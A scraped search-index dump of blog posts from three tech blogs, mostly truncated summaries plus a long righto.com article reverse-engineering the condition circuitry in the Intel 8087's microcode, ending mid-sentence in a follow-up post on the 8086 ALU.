<p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:40:49</p>"},{"location":"rakhim.exotext.com/","title":"rakhim.exotext.com","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"rakhim.exotext.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"rakhim.exotext.com/#1-alarm-is-sacred-must-not-fail-but-ios-26-is-wicked","title":"1. Alarm is sacred, must not fail, but iOS 26 is wicked","text":"<p>\u94fe\u63a5: https://rakhim.exotext.com/alarm-is-sacred-but-ios-26-is-wicked</p> <p>\u65e5\u671f: Mon, 17 Nov 2025 00:00:00 GMT</p> <p>\u6458\u8981: There are two smartphone features that I consider sacred and believe they must never fail: phone calling and the alarm. There is an unspoken contract between users and vendors. Sure, innovate away, ch...</p>"},{"location":"rakhim.exotext.com/#2-examples-are-the-best-documentation","title":"2. Examples are the best documentation","text":"<p>\u94fe\u63a5: https://rakhim.exotext.com/examples-are-the-best-documentation</p> <p>\u65e5\u671f: Sat, 27 Sep 2025 00:00:00 GMT</p> <p>\u6458\u8981: When I'm searching for docs, 95% of the time a single example would suffice. Yet, 95% of the time I can't find one in any official source. It seems that by default formal technical documentation is ta...</p>"},{"location":"rakhim.exotext.com/#3-benjamin-button-reviews-macos","title":"3. Benjamin Button Reviews macOS","text":"<p>\u94fe\u63a5: https://rakhim.exotext.com/benjamin-button-reviews-macos</p> <p>\u65e5\u671f: Wed, 17 Sep 2025 00:00:00 GMT</p> <p>\u6458\u8981: Apple's first desktop operating system was Tahoe. Like any first version, it had a lot of issues. Users and critics flooded the web with negative reviews. While mostly stable under the hood, the outer...</p>"},{"location":"rakhim.exotext.com/#4-ai-is-not-another-abstraction-because-god-plays-dice","title":"4. AI is not another abstraction because god plays dice","text":"<p>\u94fe\u63a5: https://rakhim.exotext.com/ai_is_not_another_abstraction_because_god_plays_dice</p> <p>\u65e5\u671f: Mon, 08 Sep 2025 00:00:00 GMT</p> <p>\u6458\u8981: Some folks have gone all-in on AI-assisted coding. I've seen some tweets (not sure if sarcastic or real, to be honest) expressing disgust about the prospects of ever writing code by hand anymore. The ...</p>"},{"location":"rakhim.exotext.com/#5-finland-is-a-high-context-society-that-loves-defaults","title":"5. Finland is a high-context society that loves defaults","text":"<p>\u94fe\u63a5: https://rakhim.exotext.com/finland-is-a-high-context-society-that-loves-defaults</p> <p>\u65e5\u671f: Thu, 14 Aug 2025 00:00:00 GMT</p> <p>\u6458\u8981: In anthropology there is a notion of high-context and low-context cultures. A high-context culture is a culture or society that communicates dominantly through the use of contextual elements, such as ...</p>"},{"location":"rakhim.exotext.com/01_Alarm_is_sacred__must_not_fail__but_iOS_26_is_wick/","title":"Alarm is sacred, must not fail, but iOS 26 is wicked","text":"<p>\u539f\u6587\u94fe\u63a5: https://rakhim.exotext.com/alarm-is-sacred-but-ios-26-is-wicked \u53d1\u5e03\u65e5\u671f: Mon, 17 Nov 2025 00:00:00 GMT</p> <p>There are two smartphone features that I consider sacred and believe they must never fail: phone calling and the alarm. There is an unspoken contract between users and vendors. Sure, innovate away, ch...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"rakhim.exotext.com/02_Examples_are_the_best_documentation/","title":"Examples are the best documentation","text":"<p>\u539f\u6587\u94fe\u63a5: https://rakhim.exotext.com/examples-are-the-best-documentation \u53d1\u5e03\u65e5\u671f: Sat, 27 Sep 2025 00:00:00 GMT</p> <p>When I'm searching for docs, 95% of the time a single example would suffice. Yet, 95% of the time I can't find one in any official source. It seems that by default formal technical documentation is ta...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"rakhim.exotext.com/03_Benjamin_Button_Reviews_macOS/","title":"Benjamin Button Reviews macOS","text":"<p>\u539f\u6587\u94fe\u63a5: https://rakhim.exotext.com/benjamin-button-reviews-macos \u53d1\u5e03\u65e5\u671f: Wed, 17 Sep 2025 00:00:00 GMT</p> <p>Apple's first desktop operating system was Tahoe. Like any first version, it had a lot of issues. Users and critics flooded the web with negative reviews. While mostly stable under the hood, the outer...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"rakhim.exotext.com/04_AI_is_not_another_abstraction_because_god_plays_di/","title":"AI is not another abstraction because god plays dice","text":"<p>\u539f\u6587\u94fe\u63a5: https://rakhim.exotext.com/ai_is_not_another_abstraction_because_god_plays_dice \u53d1\u5e03\u65e5\u671f: Mon, 08 Sep 2025 00:00:00 GMT</p> <p>Some folks have gone all-in on AI-assisted coding. I've seen some tweets (not sure if sarcastic or real, to be honest) expressing disgust about the prospects of ever writing code by hand anymore. The ...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"rakhim.exotext.com/05_Finland_is_a_high-context_society_that_loves_defau/","title":"Finland is a high-context society that loves defaults","text":"<p>\u539f\u6587\u94fe\u63a5: https://rakhim.exotext.com/finland-is-a-high-context-society-that-loves-defaults \u53d1\u5e03\u65e5\u671f: Thu, 14 Aug 2025 00:00:00 GMT</p> <p>In anthropology there is a notion of high-context and low-context cultures. A high-context culture is a culture or society that communicates dominantly through the use of contextual elements, such as ...</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"refactoringenglish.com/","title":"refactoringenglish.com\\n\\n\u7f51\u7ad9: https://refactoringenglish.com\\nRSS: https://refactoringenglish.com/index.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- The Most Popular Blogs of Hacker News in 2025_20260205\\n- What Makes the Intro to -Crafting Interpreters- so Good-_20260205\\n- How to Get Meaningful Feedback on Your Design Document_20260205\\n- The Software Essays that Shaped Me_20260205\\n- Adam Gordon Bell on Attracting Customers through Blogging_20260205\\n","text":""},{"location":"refactoringenglish.com/Adam%20Gordon%20Bell%20on%20Attracting%20Customers%20through%20Blogging_20260205/","title":"Adam Gordon Bell on Attracting Customers through Blogging\\n\\n\u6765\u6e90: https://refactoringenglish.com\\n\u94fe\u63a5: https://refactoringenglish.com/blog/interview-adam-gordon-bell/\\n\u65e5\u671f: Fri, 12 Sep 2025 00:00:00 +0000\\n\\n---\\n\\nAdam Gordon Bell is a developer, blogger, and the host of the software engineering podcast,\\nCoRecursive\\n. I interviewed Adam about writing and his success at attracting customers through his blog posts when he worked at Earthly.\\nWe talk about:\\nHow Adam consistently wrote blog posts that reached the front page of Hacker News\\nDiscovering blog topics that attract potential customers\\nTechniques Adam used to strengthen his writing\\nThe value of writing respectfully about your competitors\\nTranscript\\nGetting started with blogging\\nInvesting outsized effort for outsized returns\\nGetting early feedback on blog posts\\nTools for improving your writing\\nFinding focus for writing\\nCrafting blog post titles\\nPanel-of-experts style of blogging\\nBlogging respectfully about your competitor\\nImproving your writing through imitation\\nNote: I\u2019ve lightly edited the transcript for brevity.","text":""},{"location":"refactoringenglish.com/How%20to%20Get%20Meaningful%20Feedback%20on%20Your%20Design%20Document_20260205/","title":"How to Get Meaningful Feedback on Your Design Document\\n\\n\u6765\u6e90: https://refactoringenglish.com\\n\u94fe\u63a5: https://refactoringenglish.com/chapters/useful-feedback-on-design-docs/\\n\u65e5\u671f: Mon, 03 Nov 2025 00:00:00 +0000\\n\\n---\\n\\nYou\u2019ve spent weeks carefully writing a design document for your software project, but what happens next? How can you get useful feedback about it from your teammates? How do you prevent your design review from dragging on for months?\\nI\u2019ve been through many design reviews in my career as both the author and reviewer, and I have a special fondness for effective reviews. Through trial and error, I\u2019ve learned techniques that help the review process move smoothly and yield material improvements to the design.","text":""},{"location":"refactoringenglish.com/The%20Most%20Popular%20Blogs%20of%20Hacker%20News%20in%202025_20260205/","title":"The Most Popular Blogs of Hacker News in 2025\\n\\n\u6765\u6e90: https://refactoringenglish.com\\n\u94fe\u63a5: https://refactoringenglish.com/blog/2025-hn-top-5/\\n\u65e5\u671f: Fri, 02 Jan 2026 00:00:00 +0000\\n\\n---\\n\\nWith 2025 wrapped up, I can finally answer a question I\u2019m curious about every year: who were\\nthe most popular bloggers of Hacker News\\n?\\nWho counts as a blogger?\\nI explain more in\\nmy methodology page\\n, but it\u2019s basically anyone who blogs as an individual rather than as part of a company or a team. For example,\\nJohn Graham-Cumming\\nblogged while he was the CTO of Cloudflare, so I count his\\npersonal blog\\nbut not\\nhis posts to the Cloudflare company blog\\n.","text":""},{"location":"refactoringenglish.com/The%20Software%20Essays%20that%20Shaped%20Me_20260205/","title":"The Software Essays that Shaped Me\\n\\n\u6765\u6e90: https://refactoringenglish.com\\n\u94fe\u63a5: https://refactoringenglish.com/blog/software-essays-that-shaped-me/\\n\u65e5\u671f: Tue, 30 Sep 2025 00:00:00 +0000\\n\\n---\\n\\nI started reading software blogs before I got my first programming job 20 years ago. At this point, I\u2019ve read thousands of blog posts and essays about software, but only a small handful stuck in my mind and changed the way I think.\\n\u201cThe Joel Test: 12 Steps to Better Code\u201d by Joel Spolsky (2000)\\n\u201cParse, don\u2019t validate\u201d by Alexis King (2019)\\n\u201cNo Silver Bullet - Essence and Accident in Software Engineering\u201d by Fred Brooks (1986)\\n\u201cChoices\u201d by Joel Spolsky (2000)\\n\u201cApplication compatibility layers are there for the customer, not for the program\u201d by Raymond Chen (2010)\\n\u201cDon\u2019t Put Logic in Tests\u201d by Erik Kuefler (2014)\\n\u201cA little bit of plain Javascript can do a lot\u201d by Julia Evans (2020)\\n\u201cChoose Boring Technology\u201d by Dan McKinley (2015)\\n\u201cI\u2019ve locked myself out of my digital life\u201d by Terence Eden (2022)\\nBonus: Brad Fitzpatrick on parsing user input (2009)\\n\u201cThe Joel Test: 12 Steps to Better Code\u201d\\nby Joel Spolsky (2000)\\nJoel Spolsky is the greatest software blogger of all time. His essays have informed so much of my approach to software that it was hard to pick out just one, but \u201cThe Joel Test\u201d is my favorite.","text":""},{"location":"refactoringenglish.com/What%20Makes%20the%20Intro%20to%20-Crafting%20Interpreters-%20so%20Good-_20260205/","title":"What Makes the Intro to Crafting Interpreters so Good?\\n\\n\u6765\u6e90: https://refactoringenglish.com\\n\u94fe\u63a5: https://refactoringenglish.com/blog/crafting-interpreters-intro/\\n\u65e5\u671f: Wed, 19 Nov 2025 00:00:00 +0000\\n\\n---\\n\\nOne of my favorite programming books is\\nCrafting Interpreters\\nby Bob Nystrom. It teaches you how to build a programming language from scratch. Along the way, you learn about text parsing, data structures, virtual machines, and several other skills that make you a stronger developer.\\nI was re-reading the book recently and realized that its\\nintroduction\\nis delightfully effective. Developers are\\nterrible at writing introductions\\n, so it\u2019s worth studying what makes the\\nCrafting Interpreters\\nintro so compelling.","text":""},{"location":"righto.com/","title":"righto.com","text":"<p>\u4ee5\u4e0b\u662f\u672c\u535a\u5ba2\u7684\u6240\u6709\u6587\u7ae0\uff1a</p> <ul> <li>Conditions in the Intel 8087 floating-point chip's microcode_20251230</li> <li>Notes on the Intel 8086 processor's arithmetic-logic unit_20260123</li> <li>Solving the NYTimes Pips puzzle with a constraint solver_20251018</li> <li>The stack circuitry of the Intel 8087 floating point chip, reverse-engineered_20251209</li> <li>Unusual circuits in the Intel 386's standard cell logic_20251122</li> </ul> <p>\u672c\u535a\u5ba2\u6587\u7ae0\u7531 OpenClaw \u81ea\u52a8\u6293\u53d6</p>"},{"location":"righto.com/Conditions%20in%20the%20Intel%208087%20floating-point%20chip%27s%20microcode_20251230/","title":"Conditions in the Intel 8087 floating-point chip's microcode","text":"<p>\u6765\u6e90: righto.com \u53d1\u5e03\u65f6\u95f4: 2025-12-30T10:00:00.000-08:00 \u94fe\u63a5: http://www.righto.com/2025/12/8087-microcode-conditions.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.righto.com/feeds/posts/default', 'value': ' In the 1980s, if you wanted your computer to do floating-point calculations faster, you could buy\\nthe Intel 8087 floating-point coprocessor chip.\\nPlugging it into your IBM PC would make operations up to 100 times faster, a big boost for spreadsheets\\nand other number-crunching applications.\\nThe 8087 uses complicated algorithms to compute trigonometric, logarithmic, and exponential functions.\\nThese algorithms are implemented inside the chip in microcode.\\nI\\'m part of a group that is reverse-engineering this microcode.\\nIn this post, I examine the 49 types of conditional tests that the 8087\\'s microcode uses inside its algorithms.\\nSome conditions are simple, such as checking if a number is zero or negative, while others are specialized,\\nsuch as determining what direction to round a number. \\n To explore the 8087\\'s circuitry, I opened up an 8087 chip and took numerous photos of the silicon die with a microscope.\\nAround the edges of the die, you can see the hair-thin bond wires that connect the chip to its 40 external pins.\\nThe complex patterns on the die are formed by its metal wiring, as well as the polysilicon and silicon underneath.\\nThe bottom half of the chip is the \"datapath\", the circuitry that performs calculations on 80-bit floating point values. \\nAt the left of the datapath, a constant ROM holds important constants such as \u03c0.\\nAt the right are the eight registers that the\\nprogrammer uses to hold floating-point values; in an unusual design decision,\\nthese registers are arranged as a stack . \\n Die of the Intel 8087 floating point unit chip, with main functional blocks labeled. The die is 5mm\u00d76mm.  Click for a larger image. \\n The chip\\'s instructions are defined by the large microcode ROM in the middle.\\nTo execute a floating-point instruction, the 8087 decodes the instruction and the microcode engine starts executing\\nthe appropriate micro-instructions from the microcode ROM.\\nThe microcode decode circuitry to the right of the ROM generates the appropriate control signals from each micro-instruction. 1 \\nThe bus registers and control circuitry handle interactions with the main 8086 processor and the rest of the system. \\n The 8087\\'s microcode \\n Executing an 8087 instruction such as arctan requires hundreds of internal steps to compute the result.\\nThese steps are implemented in microcode with micro-instructions specifying each step of the algorithm.\\n(Keep in mind the difference between the assembly language instructions used by a programmer and the\\nundocumented low-level micro-instructions used internally by the chip.)\\nThe microcode ROM holds 1648 micro-instructions, implementing the 8087\\'s instruction set.\\nEach micro-instruction is 16 bits long and performs a simple operation such as moving data inside the chip, adding two values, or shifting data.\\nI\\'m working with the \"Opcode Collective\" to reverse engineer the micro-instructions and fully understand the microcode ( link ). \\n The microcode engine (below) controls the execution of micro-instructions, acting as the mini-CPU inside the 8087.\\nSpecifically, it generates an 11-bit micro-address, the address of a micro-instruction in the ROM.\\nThe microcode engine implements jumps, subroutine calls, and returns within the microcode.\\nThese jumps, subroutine calls, and returns are all conditional; the microcode engine will either perform the\\noperation or skip it, depending on the value of a specified condition. \\n The microcode engine. In this image, the metal is removed, showing the underlying silicon and polysilicon. \\n I\\'ll write more about the microcode engine later, but I\\'ll give an overview here.\\nAt the top, the Instruction Decode PLA 2 decodes an 8087 instruction to determine the starting address in\\nmicrocode.\\nBelow that, the Jump PLA holds microcode addresses for jumps and subroutine calls.\\nBelow this, six 11-bit registers implement the microcode stack, allowing six levels of subroutine calls inside the\\nmicrocode.\\n(Note that this stack is completely different from the 8087\\'s register stack that holds eight floating-point values.)\\nThe stack registers have associated read/write circuitry.\\nThe incrementer adds one to the micro-address to step through the code.\\nThe engine also implements relative jumps, using an adder to add an offset to the current location.\\nAt the bottom, the address latch and drivers boost the 11-bit address output\\nand send it to the microcode ROM. \\n Selecting a condition \\n A micro-instruction can say \"jump ahead 5 micro-instructions if a register is zero\" and the\\nmicrocode engine will either perform the jump or ignore it, based on the register value.\\nIn the circuitry, the condition causes the microcode engine to either perform the jump or block the jump.\\nBut how does the hardware select one condition out of the large set of conditions? \\n Six bits of the micro-instruction can specify one of 64 conditions.\\nA circuit similar to the idealized diagram below selects the specified condition.\\nThe key component is a multiplexer, represented by a trapezoid below.\\nA multiplexer is a simple circuit that selects one of its four inputs.\\nBy arranging multiplexers in a tree, one of the 64 conditions on the left is selected and becomes the output,\\npassed to the microcode engine. \\n A tree of multiplexers selects one of the conditions. This diagram is simplified. \\n For example, if bits J and K of the microcode are 00, the rightmost multiplexer will select the first input.\\nIf bits LM are 01, the middle multiplexer will select the second input, and if bits NO are 10, the left\\nmultiplexer will select its third input. The result is that condition 06 will pass through the tree and become the output. 3 \\nBy changing the bits that control the multiplexers, any of the inputs can be used.\\n(We\\'ve arbitrarily given the 16 microcode bits the letter names A through P.) \\n Physically, the conditions come from locations scattered across the die. For instance, conditions involving the opcode\\ncome from the instruction decoding part of the chip, while conditions involving a register are evaluated\\nnext to the register.\\nIt would be inefficient to run 64 wires for all the conditions to the microcode engine.\\nThe tree-based approach reduces the wiring since the \"leaf\" multiplexers can be located\\nnear the associated condition circuitry. Thus, only one wire needs to travel a long distance rather than multiple wires.\\nIn other words, the condition selection circuitry is distributed across the chip instead of being implemented as\\na centralized module. \\n Because the conditions don\\'t always fall into groups of four, the actual implementation is slightly different from\\nthe idealized diagram above.\\nIn particular, the top-level multiplexer has five inputs, rather than four. 4 \\nOther multiplexers don\\'t use all four inputs.\\nThis provides a better match between the physical locations of the condition circuits and the multiplexers.\\nIn total, 49 of the possible 64 conditions are implemented in the 8087. \\n The circuit that selects one of the four conditions is called a multiplexer.\\nIt is constructed from pass transistors, transistors that are configured to either pass a signal through\\nor block it.\\nTo operate the multiplexer, one of the select lines is energized, turning on the corresponding pass transistor.\\nThis allows the selected input to pass through the transistor to the output, while the other inputs are blocked. \\n A 4-1 multiplexer, constructed from four pass transistors. \\n The diagram below shows how a multiplexer appears on the die. The pinkish regions are doped silicon. The white\\nlines are polysilicon wires.\\nWhen polysilicon crosses over doped silicon, a transistor is formed.\\nOn the left is a four-way multiplexer, constructed from four pass transistors. It takes inputs (black) for four conditions,\\nnumbered 38, 39, 3a, and 3b.\\nThere are four control signals (red) corresponding to the four combinations of bits N and O.\\nOne of the inputs will pass through a transistor to the output, selected by the active control signal.\\nThe right half contains the logic (four NOR gates and two inverters) to generate the control signals from the\\nmicrocode bits.\\n(Metal lines run horizontally from the logic to the control signal contacts, but I dissolved the metal for this\\nphoto.)\\nEach multiplexer in the 8087 has a completely different layout,\\nmanually optimized based on the location of the signals and surrounding circuitry.\\nAlthough the circuit for a multiplexer is regular (four transistors in parallel), the physical layout looks\\nsomewhat chaotic. \\n Multiplexers as they appear on the die. The metal layer has been removed to show the polysilicon and silicon. The \"tie-die\" patterns are due to thin-film effects where the oxide layer wasn\\'t completely removed. \\n The 8087 uses pass transistors for many circuits, not just multiplexers.\\nCircuits with pass transistors are different from regular logic gates\\nbecause the pass transistors provide no amplification. Instead, signals get weaker as they go through pass\\ntransistors.\\nTo solve this problem, inverters or buffers are inserted into the condition tree to boost signals;\\nthey are omitted from the diagram above. \\n The conditions \\n Of the 8087\\'s 49 different conditions, some are widely used in the microcode, while others are designed for\\na specific purpose and are only used once.\\nThe full set of conditions is described in a footnote 7 but I\\'ll give some highlights here. \\n Fifteen conditions examine the bits of the current instruction\\'s opcode. This allows\\none microcode routine to handle a group of similar instructions and then change behavior based on the specific\\ninstruction. For example, conditions test if the instruction is multiplication, if the instruction is an FILD/FIST\\n(integer load or store), or if the bottom bit of the opcode is set. 5 \\n The 8087 has three temporary registers\u2014tmpA, tmpB, and tmpC\u2014that hold values during computation.\\nVarious conditions examine the values in the tmpA and tmpB registers. 6 \\nIn particular, the 8087 uses an interesting way to store numbers internally: each 80-bit floating-point value also \\nhas two \"tag\" bits.\\nThese bits are mostly invisible to the programmer and can be thought of as metadata.\\nThe tag bits indicate if a register is empty, contains zero, contains a \"normal\" number, or contains a special\\nvalue such as NaN (Not a Number) or infinity.\\nThe 8087 uses the tag bits to optimize operations.\\nThe tags also detect stack overflow (storing to a non-empty stack register) or stack underflow (reading from\\nan empty stack register). \\n Other conditions are highly specialized. For instance, one condition looks at the rounding mode setting and\\nthe sign of the value to determine if the value should be rounded up or down.\\nOther conditions deal with exceptions such as numbers that are too small (i.e. denormalized) or numbers that\\nlose precision.\\nAnother condition tests if two values have the same sign or not.\\nYet another condition tests if two values have the same sign or not, but inverts the result if the current\\ninstruction is subtraction.\\nThe simplest condition is simply \"true\", allowing an unconditional branch. \\n For flexibility, conditions can be \"flipped\", either jumping if the condition is true or jumping if the condition is false.\\nThis is controlled by bit P of the microcode.\\nIn the circuitry, this is implemented by a gate that XORs the P bit with the condition. The result is that the\\nstate of the condition is flipped if bit P is set. \\n For a concrete example of how conditions are used, consider the\\n microcode routine \\nthat implements FCHS and FABS , the\\ninstructions to change the sign and compute the absolute value, respectively.\\nThese operations are almost the same (toggling the sign bit versus clearing the sign bit), so the same\\nmicrocode routine handles both instructions, with a jump instruction to handle the difference.\\nThe FABS and FCHS instructions were designed with identical opcodes,\\nexcept that the bottom bit is set for FABS .\\nThus, the microcode routine uses a condition that tests the bottom bit, allowing the routine to branch and\\nchange its behavior for FABS vs FCHS . \\n Looking at the relevant micro-instruction, it has the hex value\\n 0xc094 , or in binary 110 000001 001010 0 .\\nThe first three bits (ABC=110) specify the relative jump operation (100 would jump to a fixed target and 101 would\\nperform a subroutine call.)\\nBits D through I ( 000010 ) indicate the amount of the jump (+`). \\nBits J through O ( 001010 , hex 0a) specify the condition to test, in this case, the last bit of the instruction opcode.\\nThe final bit (P) would toggle the condition if set, (i.e. jump if false).\\nThus, for FABS , the jump instruction will jump ahead one micro-instruction.\\nThis has the effect of skipping the next micro-instruction, which sets the appropriate sign bit for\\n FCHS . \\n Conclusions \\n The 8087 performs floating-point operations much faster than the 8086 by using\\nspecial hardware, optimized for floating-point.\\nThe condition code circuitry is one example of this: the 8087\\ncan test a complicated condition in a single operation.\\nHowever, these complicated conditions make it much harder to understand the microcode.\\nBut by a combination of examining the circuitry and looking at the micocode, we\\'re making progress.\\nThanks to the members of the \"Opcode Collective\" for their hard work, especially Smartest Blob and Gloriouscow. \\n For updates, follow me on\\n Bluesky ( @righto.com ),\\nMastodon ( @kenshirriff@oldbytes.space ),\\nor RSS . \\n Notes and references \\n \\n \\n \\n The section of the die that I\\'ve labeled \"Microcode decode\" performs some of the microcode decoding, but\\nlarge parts of the decoding are scattered across the chip, close to the circuitry that needs the signals.\\nThis makes reverse-engineering the microcode much more difficult.\\nI thought that understanding the microcode would be straightforward, just examining a block of decode circuitry.\\nBut this project turned out to be much more complicated and I need to reverse-engineer the entire chip. \u21a9 \\n \\n \\n A PLA is a \"Programmable Logic Array\". It is a technique to implement logic functions with grids of transistors.\\nA PLA can be used as a compressed ROM, holding data in a more compact representation.\\n(Saving space was very important in chips of this era.)\\nIn the 8087, PLAs are used to hold tables of microcode addresses. \u21a9 \\n \\n \\n Note that the multiplexer circuit selects the condition corresponding to the binary value of the bits.\\nIn the example, bits 000110 (0x06) select condition 06. \u21a9 \\n \\n \\n The five top-level multiplexer inputs correspond to bit patterns 00, 011, 10, 110, and 111.\\nThat is, two inputs depend on bits J and K, while three inputs depend on bits J, K, and L.\\nThe bit pattern 010 is unused, corresponding to conditions 0x10 through 0x17, which aren\\'t implemented. \u21a9 \\n \\n \\n The 8087 acts as a co-processor with the 8086 processor.\\nThe 8086 instruction set is designed so instructions with a special \"ESCAPE\" sequence in the top 5 bits\\nare processed by the co-processor, in this case the 8087.\\nThus, the 8087 receives a 16-bit instruction, but only the bottom 11 bits are usable.\\nFor a memory operation, the second byte of the instruction is an 8086-style ModR/M byte.\\nFor instructions that don\\'t access memory, the second byte specifies more of the instruction and sometimes specifies the\\nstack register to use for the instruction. \\n The relevance of this is that the 8087\\'s microcode engine uses the 11 bits of the instruction to determine\\nwhich microcode routine to execute.\\nThe microcode also uses various condition codes to change behavior depending on different bits of the\\ninstruction. \u21a9 \\n \\n \\n There is a complication with the tmpA and tmpB registers: they can be swapped with the micro-instruction\\n\"ABC.EF\". \\nThe motivation behind this is that if you have two arguments, you can use a micro-subroutine to load\\nan argument into tmpA, swap the registers, and then use the same subroutine to load the second argument\\ninto tmpA. The result is that the two arguments end up in tmpB and tmpA without any special coding in\\nthe subroutine. \\n The implementation doesn\\'t physically swap the registers, but renames them internally, which is\\nmuch more efficient.\\nA flip-flop is toggled every time the registers are swapped. If the flip-flop is set, a request goes\\nto one register, while if the flip-flop is clear, a request goes to the other register.\\n(Many processors use the same trick. For instance, the Intel 8080 has an instruction to exchange the\\nDE and HL registers. The Z80 has an instruction to swap register banks. In both cases, a flip-flop\\nrenames the registers, so the data doesn\\'t need to move.) \u21a9 \\n \\n \\n The table below is the real meat of this post, the result of much circuit analysis. These details probably aren\\'t\\ninteresting to most people, so I\\'ve relegated the table to a footnote.\\nDescriptions in italics are provided by Smartest Blob based on examination of the microcode.\\nGrayed-out lines are unused conditions. \\n The table has five sections, corresponding to the 5 inputs to the top-level condition multiplexer.\\nThese inputs come from different parts of the chip, so the sections correspond to different categories of\\nconditions. \\n The first section consists of instruction parsing, with circuitry near the microcode engine.\\nThe description shows the 11-bit opcode pattern that triggers the condition, with 0 bits and 1 bits as\\nspecified, and X indicating a \"don\\'t care\" bit that can be 0 or 1.\\nWhere simpler, I list the relevant instructions instead. \\n The next section indicates conditions on the exponent. I am still investigating these conditions, so\\nthe descriptions are incomplete.\\nThe third section is conditions on the temporary registers or conditions related to the control register.\\nThese circuits are to the right of the microcode ROM. \\n Conditions in the fourth section examine the floating-point bus, with circuitry near the bottom of the chip.\\nConditions 34 and 35 use a special 16-bit bidirectional shift register, at the far right of the chip.\\nThe top bit from the floating-point bus is shifted in. Maybe this shift register is used for CORDIC\\ncalculations?\\nThe conditions in the final block are miscellaneous, including the always-true condition 3e, which is used\\nfor unconditional jumps. \\n \\n \\n Cond. Description \\n 00 not XXX 11XXXXXX \\n 01 1XX 11XXXXXX \\n 02 0XX 11XXXXXX \\n 03 X0X XXXXXXXX \\n 04 not cond 07 or 1XX XXXXXXXX \\n 05 not FLD/FSTP temp-real or BCD \\n 06 110 xxxxxxxx or 111 xx0xxxxx \\n 07 FLD/FSTP temp-real \\n 08 FBLD/FBSTP \\n 09 \\n 0a XXX XXXXXXX1 \\n 0b XXX XXXX1XXX \\n 0c FMUL \\n 0d FDIV FDIVR \\n 0e FADD FCOM FCOMP FCOMPP FDIV FDIVR FFREE FLD FMUL FST FSTP FSUB FSUBR FXCH \\n 0f FCOM FCOMP FCOMPP FTST \\n 10 \\n 11 \\n 12 \\n 13 \\n 14 \\n 15 \\n 16 \\n 17 \\n 18 exponent condition \\n 19 exponent condition \\n 1a exponent condition \\n 1b exponent condition \\n 1c exponent condition \\n 1d exponent condition \\n 1e eight exponent zero bits \\n 1f exponent condition \\n 20 tmpA tag ZERO \\n 21 tmpA tag SPECIAL \\n 22 tmpA tag VALID \\n 23 stack overflow \\n 24 tmpB tag ZERO \\n 25 tmpB tag SPECIAL \\n 26 tmpB tag VALID \\n 27 st(i) doesn\\'t exist (A)? \\n 28 tmpA sign \\n 29 tmpB top bit \\n 2a tmpA zero \\n 2b tmpA top bit \\n 2c Control Reg bit 12: infinity control \\n 2d round up/down \\n 2e unmasked interrupt \\n 2f DE (denormalized) interrupt \\n 30 top reg bit \\n 31 \\n 32 reg bit 64 \\n 33 reg bit 63 \\n 34 Shifted top bits, all zero \\n 35 Shifted top bits, one out \\n 36 \\n 37 \\n 38 const latch zero \\n 39 tmpA vs tmpB sign, flipped for subtraction \\n 3a precision exception \\n 3b tmpA vs tmpB sign \\n 3c \\n 3d \\n 3e unconditional \\n 3f \\n \\n This table is under development and undoubtedly has errors. \u21a9 \\n \\n \\n '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:51:49</p>"},{"location":"righto.com/Notes%20on%20the%20Intel%208086%20processor%27s%20arithmetic-logic%20unit_20260123/","title":"Notes on the Intel 8086 processor's arithmetic-logic unit","text":"<p>\u6765\u6e90: righto.com \u53d1\u5e03\u65f6\u95f4: 2026-01-23T09:09:00.000-08:00 \u94fe\u63a5: http://www.righto.com/2026/01/notes-on-intel-8086-processors.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://www.righto.com/feeds/posts/default', 'value': ' In 1978, Intel introduced the 8086 processor, a revolutionary chip that led to the modern x86 architecture.\\nUnlike modern 64-bit processors, however, the 8086 is a 16-bit chip.\\nIts arithmetic/logic unit (ALU) operates on 16-bit values, performing arithmetic operations such as addition and subtraction,\\nas well as logic operations including bitwise AND, OR, and XOR.\\nThe 8086\\'s ALU is a complicated part of the chip, performing 28 operations in total. 1 \\n In this post, I discuss the circuitry that controls the ALU, generating the appropriate control signals for a\\nparticular operation.\\nThe process is more complicated than you might expect. First, a machine code instruction results in the execution of multiple\\nmicrocode instructions.\\nUsing the ALU is a two-step process: one microcode instruction (micro-instruction) configures the ALU for the desired operation,\\nwhile a second\\nmicro-instruction gets the results from the ALU.\\nMoreover, based on both the microcode micro-instruction and the machine code instruction, the control circuitry sends control signals to the ALU,\\nreconfiguring it for the desired operation.\\nThus, this circuitry provides the \"glue\" between the micro-instructions and the ALU. \\n The die photo below shows the 8086 processor under a microscope.\\nI\\'ve labeled the key functional blocks.\\nArchitecturally, the chip is partitioned into a Bus Interface Unit (BIU) at the top and an Execution Unit (EU) below.\\nThe BIU handles bus and memory activity as well as instruction prefetching, while the Execution Unit (EU) executes the instructions.\\nIn the lower right corner, the microcode ROM holds the micro-instructions.\\nThe ALU is in the lower left corner, with bits 7-0 above and bits 15-8 below, sandwiching the status flag circuitry.\\nThe ALU control circuitry, highlighted in red at the bottom of the chip, is the focus of this article. \\n The die of the 8086. Click this image (or any other) for a larger version. \\n Microcode \\n The 8086 processor implements most machine instructions in microcode, 